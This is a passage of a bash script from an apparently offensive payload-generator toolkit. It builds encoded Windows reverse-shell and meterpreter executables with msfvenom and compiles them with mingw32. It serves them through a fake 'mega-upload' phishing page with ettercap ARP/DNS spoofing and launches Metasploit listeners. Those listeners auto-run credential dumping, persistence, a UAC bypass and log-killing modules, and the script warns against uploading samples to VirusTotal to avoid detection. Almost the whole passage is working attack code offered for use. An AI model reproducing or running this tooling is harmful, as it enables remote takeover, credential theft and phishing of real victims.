       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi


       # CLEANING EVERYTHING UP
       echo "[☠] Cleanning temp generated files..."
       mv $IPATH/templates/exec[bak].py $InJEc2
       rm $IPATH/output/chars.raw > /dev/null 2>&1
       sleep 2
       clear

     else

       # compile python to exe
       echo ""
       echo "[☠] pyinstaller -> not found!"
       sleep 2
       echo "[☠] Please run: cd aux && sudo ./setup.sh"
       echo "[☠] to install all missing dependencies .."
       exit
     fi
   fi
cd $IPATH/
}





# -----------------------------------------------------
# build shellcode in EXE format (windows-platforms)
# encoded only using msfvenom encoders :( 
# NOTE: use or not PEScrambler on this or msf -x -k ?...
# it flags 12/55 detections this build .
# ------------------------------------------------------
sh_shellcode5 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> C format ..."
echo "[☠] obfuscating -> msf encoders!"
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c > $IPATH/output/chars.raw"


echo ""
# display generated code
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc3 ]; then
      echo "[☠] exec_bin.c -> found!"
      sleep 2
   else
      echo "[☠] exec_bin.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
cp $InJEc3 $IPATH/templates/exec_bin[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc3 > /dev/null 2>&1
   else
      gedit $InJEc3 > /dev/null 2>&1
   fi


cd $IPATH/templates
# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
$ComP exec_bin.c -o $N4m.exe -lws2_32 -mwindows
mv $N4m.exe $IPATH/output/$N4m.exe


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.exe|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}




# -----------------------------------------------------
# build shellcode in PSH-CMD format (windows-platforms)
# using a C template embbebed with powershell shellcode
# ------------------------------------------------------
sh_shellcode6 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> psh-cmd format ..."
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PSH-CMD -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"


str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "$str0" > $IPATH/output/chars.raw
# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 3
echo $str0
echo "" && echo ""


   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc15 ]; then
      echo "[☠] exec_psh.c -> found!"
      sleep 2
   else
      echo "[☠] exec_psh.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw  -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw  -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
cd $IPATH/templates
cp $InJEc15 $IPATH/templates/exec_psh[bak].c
echo "[☠] Injecting shellcode -> $N4m.exe!"
sleep 2
sed "s|InJ3C|$str0|" exec_psh.c > final.c


# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows flag :D
$ComP final.c -o $N4m.exe -mwindows
mv $N4m.exe $IPATH/output/$N4m.exe


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.exe|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec_psh[bak].c $InJEc15 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/templates/final.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}




# ------------------------------------------------------------
# build shellcode in ruby (windows-platforms)
# veil-evasion ruby payload reproduction (the stager)...
# ruby_stager (template) by: @G0tmi1k @chris truncker @harmj0y
# ------------------------------------------------------------
sh_shellcode7 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> C format ..."
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc4 ]; then
      echo "[☠] exec.rb -> found!"
      sleep 2
   else
      echo "[☠] exec.rb -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
cp $InJEc4 $IPATH/templates/exec[bak].rb
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
